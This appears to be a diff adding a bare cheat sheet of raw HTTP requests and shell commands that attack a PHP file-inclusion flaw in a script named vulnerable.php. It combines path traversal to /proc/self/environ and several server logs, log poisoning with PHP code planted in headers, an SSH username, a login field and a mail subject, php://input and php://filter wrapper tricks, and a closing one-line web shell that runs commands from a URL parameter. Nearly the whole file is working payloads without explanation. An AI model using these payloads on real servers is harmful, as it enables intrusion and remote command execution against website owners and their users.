@@ -1,0 +1,44 @@
+GET vulnerable.php?filename=../../../proc/self/environ HTTP/1.1
+User-Agent: <?=phpinfo(); ?>
+
+
+
+
+POST vulnerable.php?filename=php://input HTTP/1.1
+Host: victim.com
+<?=system('ls'); ?>
+
+
+
+
+GET vulnerable.php?filename=php://filter/convert.base64-encode/resource=../vulnerable.php HTTP/1.1
+GET vulnerable.php?filename[]= HTTP/1.1
+Referer: <?=phpinfo();?>
+--
+GET vulnerable.php?filename=../../../var/log/nginx/error_log HTTP/1
+
+
+
+
+ssh <?=phpinfo();?>@<ip-of-vulnerable-target>
+--
+GET vulnerable.php?filename=../../../var/log/auth.log HTTP/1.1
+
+
+POST login.php HTTP/1.1
+Host: victim.com
+
+username=<?=phpinfo();?>&password=test
+---
+GET vulnerable.php?filename=../../../var/log/nginx/error_log HTTP/1.1
+
+
+
+mail -s "<?=phpinfo();?>" www-data@victim.com < /dev/null
+---
+GET vulnerable.php?filename=../../../var/log/www-data HTTP/1.1
+
+
+?cmd=ls
+
+<?php system($_GET['cmd']); ?>
